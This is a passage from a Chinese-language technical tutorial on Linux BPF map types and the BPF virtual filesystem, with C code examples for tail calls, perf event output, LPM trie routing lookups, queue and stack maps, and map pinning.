class="line">&#125;;</span><br><span class="line">prog_fd = bpf_prog_load(BPF_PROG_TYPE_KPROBE, prog, <span class="keyword">sizeof</span>(prog), <span class="string">"GPL"</span>); </span><br><span class="line">bpf_map_update_elem(&amp;programs, &amp;key, &amp;prog_fd, BPF_ANY);</span><br></pre></td></tr></table></figure><p>我们需要声明我们要跳转到的程序。 在这种情况下，我们正在编写一个BPF程序，其唯一目的是返回0。我们使用<code>bpf_prog_load</code>将其加载到内核中，然后将其文件描述符标识符添加到我们的程序映射中。</p><p>现在我们已经存储了该程序，我们可以编写另一个将跳转到它的BPF程序。 BPF程序只有在同类型的情况下才能跳转到其他程序，在这种情况下，我们将程序附加到<code>kprobe</code>跟踪</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/seccomp_phase1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_kprobe_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">1</span>;</span><br><span class="line"><span class="comment">/* dispatch into next BPF program */</span> </span><br><span class="line">  bpf_tail_call(ctx, &amp;programs, &amp;key);</span><br><span class="line">  <span class="comment">/* fall through when the program descriptor is not in the map */</span></span><br><span class="line"><span class="keyword">char</span> fmt[] = <span class="string">"missing program in prog_array map\n"</span>; </span><br><span class="line">  bpf_trace_printk(fmt, <span class="keyword">sizeof</span>(fmt));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>bpf_tail_call</code>和<code>BPF_MAP_TYPE_PROG_ARRAY</code>最多可以链接 32 个嵌套调用。 这样可以防止无限循环和内存耗尽。</p><h4 id="Perf事件数组映射"><a href="#Perf事件数组映射" class="headerlink" title="Perf事件数组映射"></a>Perf事件数组映射</h4><p>这些类型的映射将<code>perf_events</code>数据存储在环形缓冲区中，该环形缓冲区在BPF程序和用户空间程序之间进行实时通信。 它们使用<code>BPF_MAP_TYPE_PERF_EVENT_ARRAY</code>类型定义。 旨在将内核跟踪工具发出的事件转发给用户空间程序以做进一步处理。用户空间程序充当监听器，等待来自内核的事件，因此你需要确保你写的代码在内核中的BPF程序初始化之前开始监听。</p><p>让我们看一个示例，说明如何跟踪计算机执行的所有程序。 在进入BPF程序代码之前，我们需要声明我们将从内核发送到用户空间的事件结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">u32 pid;</span><br><span class="line"><span class="keyword">char</span> program_name[<span class="number">16</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在，我们需要创建将事件发送到用户空间的映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> events </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PERF_EVENT_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(u32), </span><br><span class="line">  .max_entries = <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在我们声明了数据类型和映射后，我们可以创建捕获数据并将其发送到用户空间的BPF程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/sys_exec"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_capture_exec</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">data_t</span> data;</span><br><span class="line"><span class="comment">// bpf_get_current_pid_tgid returns the current process identifier </span></span><br><span class="line">  data.pid = bpf_get_current_pid_tgid() &gt;&gt; <span class="number">32</span>;</span><br><span class="line">  <span class="comment">// bpf_get_current_comm loads the current executable name</span></span><br><span class="line">bpf_get_current_comm(&amp;data.program_name, <span class="keyword">sizeof</span>(data.program_name)); </span><br><span class="line">  bpf_perf_event_output(ctx, &amp;events, <span class="number">0</span>, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此代码段中，我们使用<code>bpf_perf_event_output</code>将数据附着到<code>map</code>中。 因为这是一个实时缓冲区，所以你不必担心<code>map</code>中元素的键，内核负责将新元素添加到<code>map</code>并在用户空间程序处理它后刷新它。</p><h4 id="Per-CPU哈希映射"><a href="#Per-CPU哈希映射" class="headerlink" title="Per-CPU哈希映射"></a>Per-CPU哈希映射</h4><p>这种类型的映射是<code>BPF_MAP_TYPE_HASH</code>的改进版本。 这些映射使用<code>BPF_MAP_TYPE_PERCPU_HASH</code>类型定义。 当你分配其中一个映射时，每个CPU都会看到它自身隔离版本的映射，这使得高性能查找和聚合更加高效。 如果你的BPF程序收集指标并将它们聚合到哈希表映射中，使用这种类型的映射就很有用。</p><h4 id="Per-CPU数组映射"><a href="#Per-CPU数组映射" class="headerlink" title="Per-CPU数组映射"></a>Per-CPU数组映射</h4><p>这种类型的地图也是<code>BPF_MAP_TYPE_ARRAY</code>的改进版本。 它们使用<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>类型定义。</p><h4 id="堆栈跟踪映射"><a href="#堆栈跟踪映射" class="headerlink" title="堆栈跟踪映射"></a>堆栈跟踪映射</h4><p>这种类型的映射存储正在运行的进程的堆栈跟踪。 它们使用<code>BPF_MAP_TYPE_STACK_TRACE</code>类型定义。 除了这个映射，内核开发人员已经添加了帮助程序<code>bpf_get_stackid</code>来帮助你使用堆栈跟踪填充这个映射。此帮助程序将映射作为参数和一系列标志，以便你可以指定是否只需要来自内核、只来自用户空间或两者的跟踪。帮助器返回与添加到<code>map</code>中的元素关联的键。</p><h4 id="Cgroup数组映射"><a href="#Cgroup数组映射" class="headerlink" title="Cgroup数组映射"></a>Cgroup数组映射</h4><p>这种类型的映射存储对<code>cgroups</code>的引用。<code>Cgroup</code>数组映射使用<code>BPF_MAP_TYPE_CGROUP_ARRAY</code>类型定义。 本质上，它们的行为类似于<code>BPF_MAP_TYPE_PROG_ARRAY</code>，但它们存储指向<code>cgroup</code>的文件描述符标识符。</p><p>当你希望在<code>BPF map</code>之间共享<code>cgroup</code>引用以控制流量、调试和测试时，该映射会非常有用。 让我们看一个如何填充此映射的示例。 我们从映射定义开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> cgroups_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_CGROUP_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), </span><br><span class="line">  .max_entries = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以通过打开包含<code>cgroup</code>信息的文件来拿到<code>cgroup</code>的文件描述符。 我们将打开控制<code>Docker</code>容器的基本CPU额度的<code>cgroup</code>，并将该<code>cgroup</code>存储在我们的映射中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cgroup_fd, key = <span class="number">0</span>;</span><br><span class="line">cgroup_fd = open(<span class="string">"/sys/fs/cgroup/cpu/docker/cpu.shares"</span>, O_RDONLY);</span><br><span class="line">bpf_update_elem(&amp;cgroups_map, &amp;key, &amp;cgroup_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="LRU哈希和Per-CPU哈希映射"><a href="#LRU哈希和Per-CPU哈希映射" class="headerlink" title="LRU哈希和Per-CPU哈希映射"></a>LRU哈希和Per-CPU哈希映射</h4><p>这两种类型的映射是哈希表映射，但它们也实现了内部LRU缓存。 LRU代表最近最少使用，这意味着如果映射已满，这些映射将删除不经常使用的元素，以便为映射中的新元素腾出空间。 因此，你可以使用这些映射来插入超出最大限制的元素，只要不介意丢失最近未使用的元素。 它们使用<code>BPF_MAP_TYPE_LRU_HASH</code>和<code>BPF_MAP_TYPE_LRU_PERCPU_HASH</code>类型定义。</p><p>此映射的<code>per cpu</code>版本与之前看到的其他<code>per cpu</code>映射略有不同。 该映射只保留一个哈希表来存储映射中的所有元素，并且每个CPU使用不同的LRU缓存，这样可以确保每个CPU中最常用的元素保留在映射中。</p><h4 id="LPM-Trie映射"><a href="#LPM-Trie映射" class="headerlink" title="LPM Trie映射"></a>LPM Trie映射</h4><p><code>LPM trie</code>映射是使用最长前缀匹配(LPM)来查找映射中元素的映射类型。LPM是一种算法，它从树中的任何其他匹配项中选择与最长查找键匹配的元素。此算法用于保留流量转发表以将IP地址与特定路由的路由器和其他设备进行匹配。 这些映射使用<code>BPF_MAP_TYPE_LPM_TRIE</code>类型定义。</p><p>这些映射要求<code>key</code>的大小为8的倍数，范围为8到2048。 如果你不想实现自己的<code>key</code>，内核提供了一个结构体，可以将其用于这些<code>keys</code>，称为<code>bpf_lpm_trie_key</code>。</p><p>在下一个示例中，我们将两个转发路由添加到映射并尝试将IP地址匹配到正确的路由。 首先我们需要创建映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> routing_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_LPM_TRIE,</span><br><span class="line">.key_size = <span class="number">8</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">10000</span>,</span><br><span class="line">  .map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们将使用三个转发路由填充此映射: <code>192.168.0.0/16、192.168.0.0/24 和 192.168.1.0/24</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> value_1 = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_1</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">16</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_2 = <span class="number">2</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_2</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;; </span><br><span class="line"><span class="keyword">uint64_t</span> value_3 = <span class="number">3</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">route_3</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, .prefixlen = <span class="number">24</span>&#125;;</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_1, &amp;value_1, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_2, &amp;value_2, BPF_ANY);</span><br><span class="line">bpf_map_update_elem(&amp;routing_map, &amp;route_3, &amp;value_3, BPF_ANY);</span><br></pre></td></tr></table></figure><p>现在，我们使用相同的<code>keys</code>结构来查找IP地址<code>192.168.1.1/32</code>的正确匹配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_lpm_trie_key</span> <span class="title">lookup</span> = &#123;</span>.data = &#123;<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, .prefixlen = <span class="number">32</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ret = bpf_map_lookup_elem(&amp;routing_map, &amp;lookup, &amp;result); </span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, result);</span><br></pre></td></tr></table></figure><p>在此示例中，<code>192.168.0.0/16</code>和<code>192.168.1.0/24</code>都可以匹配查找IP，因为该IP都在这两个范围内。 但是，由于该映射使用LPM 算法，结果将填充键为<code>192.168.1.0/24</code>的值。</p><h4 id="数组映射和哈希映射"><a href="#数组映射和哈希映射" class="headerlink" title="数组映射和哈希映射"></a>数组映射和哈希映射</h4><p><code>BPF_MAP_TYPE_ARRAY_OF_MAPS</code>和<code>BPF_MAP_TYPE_HASH_OF_MAPS</code>是存储对其它映射的引用的两种类型的映射。 它们仅支持一级间接引用，因此不能使用它们来存储映射的映射的映射。 这可确保不会因意外存储无限链式映射而消耗所有内存。</p><p>当你希望在运行时替换整个映射时，这些类型的映射很有用。 如果你的所有映射都是全局映射的子集，那么可以创建全状态快照。 内核确保父映射中的任何更新操作都等到所有旧的子映射的引用都被删除后才完成操作。</p><h4 id="Device-Map映射"><a href="#Device-Map映射" class="headerlink" title="Device Map映射"></a>Device Map映射</h4><p>这种特殊类型的映射存储对网络设备的引用。这些映射使用<code>BPF_MAP_TYPE_DEVMAP</code>类型定义。 它们对想在内核级别操纵流量的网络应用程序很有用。你可以构建指向特定网络设备的端口虚拟映射，然后使用帮助器<code>bpf_redirect_map</code>重定向数据包。</p><h4 id="CPU-Map映射"><a href="#CPU-Map映射" class="headerlink" title="CPU Map映射"></a>CPU Map映射</h4><p><code>BPF_MAP_TYPE_CPUMAP</code>是另一种允许转发网络流量的映射。在这种情况下，映射存储对主机中不同CPU的引用。 与之前的映射类型一样，你可以将其与<code>bpf_redirect_map</code>帮助程序一起使用来重定向数据包。但是，此映射将数据包发送到不同的CPU。这允许将特定CPU分配给网络堆栈以实现可扩展性和隔离目的。</p><h4 id="Open-Socket映射"><a href="#Open-Socket映射" class="headerlink" title="Open Socket映射"></a>Open Socket映射</h4><p><code>BPF_MAP_TYPE_XSKMAP</code>是一种存储对打开套接字的引用的映射。 与之前的映射一样，这些映射对于套接字之间转发数据包很有用。</p><h4 id="Socket-Array和Hash映射"><a href="#Socket-Array和Hash映射" class="headerlink" title="Socket Array和Hash映射"></a>Socket Array和Hash映射</h4><p><code>BPF_MAP_TYPE_SOCKMAP</code>和<code>BPF_MAP_TYPE_SOCKHASH</code>是两个专门的映射，它们存储对内核中打开套接字的引用。 与前面的映射一样，这种类型的映射与帮助程序<code>bpf_redirect_map</code>一起使用，将套接字缓冲区从当前XDP程序转发到不同的套接字。</p><p>它们的主要区别在于其中一个使用数组来存储套接字，而另一个使用哈希表。使用哈希表的好处是你可以直接通过它的键访问一个套接字，而不需要遍历完整的映射来找到它。内核中的每个套接字都由一个五元组键标识。 这五个元组包含建立双向网络连接所需的信息。 当使用此映射的哈希表版本时，你可以将此键用作映射中的查找键。</p><h4 id="Cgroup-Storage-and-Per-CPU-Storage映射"><a href="#Cgroup-Storage-and-Per-CPU-Storage映射" class="headerlink" title="Cgroup Storage and Per-CPU Storage映射"></a>Cgroup Storage and Per-CPU Storage映射</h4><p>引入这两种类型的映射是为了帮助开发人员使用附着到<code>cgroup</code>的BPF程序。 你可以将BPF程序与控制组连接和分离，并使用<code>BPF_PROG_TYPE_CGROUP_SKB</code>将它们的运行时隔离到特定的<code>cgroup</code>。 这两个映射使用 <code>BPF_MAP_TYPE_CGROUP_STORAGE</code>和<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>类型定义。</p><p>从开发人员的角度来看，这些类型的映射类似于哈希表映射。内核提供了一个结构助手来为这个映射生成键，<code>bpf_cgroup_storage_key</code>，其中包括有关<code>cgroup</code>节点标识符和附加类型的信息。 你可以在此映射中添加任何想要的值，它的访问权限将仅限于附加<code>cgroup</code>内的BPF程序。</p><p>这些映射有两个限制。首先是你不能从用户空间在映射中创建新元素。内核中的BPF程序可以使用<code>bpf_map_update_elem</code>创建元素，但是如果你在用户空间使用此方法并且<code>key</code>不存在，则    <code>bpf_map_update_elem</code>将失败，并且<code>errno</code>将被设置为<code>ENOENT</code>。 第二个限制是你不能从此映射中删除元素。<code>bpf_map_delete_elem</code>总是失败并将<code>errno</code>设置为<code>EINVAL</code>。</p><p>这两种类型的映射之间的主要区别是<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>为每个CPU保留不同的哈希表。</p><h4 id="Reuseport-Socket映射"><a href="#Reuseport-Socket映射" class="headerlink" title="Reuseport Socket映射"></a>Reuseport Socket映射</h4><p>这种特殊类型的映射存储对系统中的开放端口重用的套接字的引用。它们使用<code>BPF_MAP_TYPE_REUSE PORT_SOCKARRAY</code>类型定义。这些映射主要用于<code>BPF_PROG_TYPE_SK_REUSEPORT</code>程序类型。 结合起来，你可以控制决定如何过滤和处理来自网络设备的传入数据包。例如，可以决定哪些数据包发送到哪个套接字，即使两个套接字都连接到同一个端口。</p><h4 id="Queue映射"><a href="#Queue映射" class="headerlink" title="Queue映射"></a>Queue映射</h4><p>队列映射使用先进先出(FIFO)存储将元素保留在映射中。它们使用<code>BPF_MAP_TYPE_QUEUE</code>类型定义。FIFO意味着当从映射中获取元素时，结果将是映射中存在时间最长的元素。</p><p>对于这种数据结构，bpf映射帮助器以一种可预测的方式工作。当使用<code>bpf_map_lookup_elem</code>时，此映射始终在映射中查找最旧的元素。 当使用<code>bpf_map_update_elem</code>时，此映射始终将元素附加到队列的末尾，因此你需要先读取映射中的其余元素，然后才能获取此元素。 当然你还可以使用帮助程序<code>bpf_map_lookup_and_delete</code>获取较旧的元素并以原子方式将其从映射中删除。此映射不支持帮助函数<code>bpf_map_delete_elem</code>和<code>bpf_map_get_next_key</code>。 如果尝试使用它们，它们将失败并将<code>errno</code>变量设置为<code>EINVAL</code>。</p><p>关于这些类型的映射，需要记住的是它们不使用映射键进行查找，并且在初始化这些映射时键大小必须始终为 0。 当你将元素推送到这些映射时，键必须是空值。</p><p>接下来看一个如何使用这类映射的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> queue_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_QUEUE,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们在这个映射中插入几个元素，并按照我们插入的顺序检索它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;queue_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;queue_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '0'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '4'</span><br></pre></td></tr></table></figure><p>如果我们再尝试从映射中弹出一个新元素，<code>bpf_map_lookup_and_delete</code>将返回一个负数，并且<code>errno</code>变量将设置为<code>ENOENT</code>。</p><h4 id="Stack映射"><a href="#Stack映射" class="headerlink" title="Stack映射"></a>Stack映射</h4><p>堆栈映射使用先进后出 (FILO)存储将元素保留在映射中。 它们使用<code>BPF_MAP_TYPE_STACK</code>类型定义。 FILO意味着当你从映射中获取元素时，结果将是最近添加到映射中的元素。</p><p>对于这种数据结构，bpf映射助手也以可预测的方式工作。当你使用<code>bpf_map_lookup_elem</code>时，此映射总是寻找最新的元素。当你使用<code>bpf_map_update_elem</code>时，此映射始终将元素附加到堆栈顶部，因此它是第一个获取的元素。你还可以使用帮助程序<code>bpf_map_lookup_and_delete</code>获取最新元素并以原子方式将其从映射中删除。此映射不支持帮助函数<code>bpf_map_delete_elem</code>和<code>bpf_map_get_next_key</code>。 如果你尝试使用它们，它们将始终失败并将 <code>errno</code>变量设置为<code>EINVAL</code>。</p><p>接下来看一个如何使用这类映射的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> stack_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_STACK,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们在这个映射中插入几个元素，并按照我们插入的顺序检索它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;stack_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;stack_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '4'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '0'</span><br></pre></td></tr></table></figure><p>如果我们再尝试从映射中弹出一个新元素，<code>bpf_map_lookup_and_delete</code>将返回一个负数，并且<code>errno</code>变量将设置为<code>ENOENT</code>。</p><p>正如我们前面提到的，BPF映射作为常规文件存储在你的操作系统中。但是我们还没有讨论内核用来保存映射和程序的文件系统的具体特征。下一部分将介绍BPF文件系统，以及可以从中获得的持久性类型。</p><h3 id="BPF虚拟文件系统"><a href="#BPF虚拟文件系统" class="headerlink" title="BPF虚拟文件系统"></a>BPF虚拟文件系统</h3><p>BPF映射的一个基本特征是基于文件描述符，这意味着当一个描述符关闭时，映射和它所保存的所有信息都会消失。BPF映射的最初实现专注于时间短且隔离的程序，它们之间不共享任何信息。在这些情况下，当文件描述符关闭时擦除所有数据很有意义。然而，随着内核中引入更复杂的映射和集成，其开发人员意识到他们需要一种方法来保存映射所持有的信息，即使在程序终止并关闭映射的文件描述符之后也是如此。Linux内核<code>4.4</code>版引入了两个新的系统调用，允许从虚拟文件系统固定和获取映射和BPF程序。 固定到该文件系统的Map和BPF程序将在创建它们的程序终止后保留在内存中。 在本节中，我们将解释如何使用这个虚拟文件系统。</p><p>BPF虚拟文件系统的默认目录是<code>/sys/fs/bpf</code>，一些Linux发行版默认不挂载这个文件系统，因为它们假设内核不支持BPF。你可以使用<code>mount</code>命令自行挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t bpf /sys/fs/bpf /sys/fs/bpf</span><br></pre></td></tr></table></figure><p>与其他文件层次结构一样，文件系统中的BPF持久化对象由路径标识。你可以以任何方式组织这些路径使得程序有意义。例如，如果你想在程序之间共享带有IP信息的特定映射，你可以将其存储在<code>/sys/fs/bpf/shared/ips</code>中。正如我们前面提到的，有两种类型的对象可以保存在这个文件系统中：BPF映射和完整的BPF程序。这两者都由文件描述符标识，因此使用它们的接口是相同的。 这些对象只能由bpf系统调用操作。 尽管内核提供了高级助手来帮助你与它们交互，但是不能做诸如尝试使用<code>open</code>系统调用打开这些文件之类的操作。</p><p><code>BPF_PIN_FD</code>是在这个文件系统中保存BPF对象的命令。当命令成功时，该对象将在你指定的路径中的文件系统中可见。如果命令失败，则返回一个负数，并使用错误代码设置全局<code>errno</code>变量。</p><p><code>BPF_OBJ_GET</code>是获取已固定到文件系统的BPF对象的命令。 此命令使用你分配的对象路径来加载它。 当此命令成功时，它会返回与对象关联的文件描述符标识符。 如果失败，则返回一个负数，并使用特定的错误代码设置全局errno变量。</p><p>让我们看一个例子，说明如何使用内核提供的辅助函数在不同的程序中利用这两个命令。首先，我们要编写一个程序来创建一个映射，用几个元素填充它，并将它保存在文件系统中：</p><p><code>map_pinning_save.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  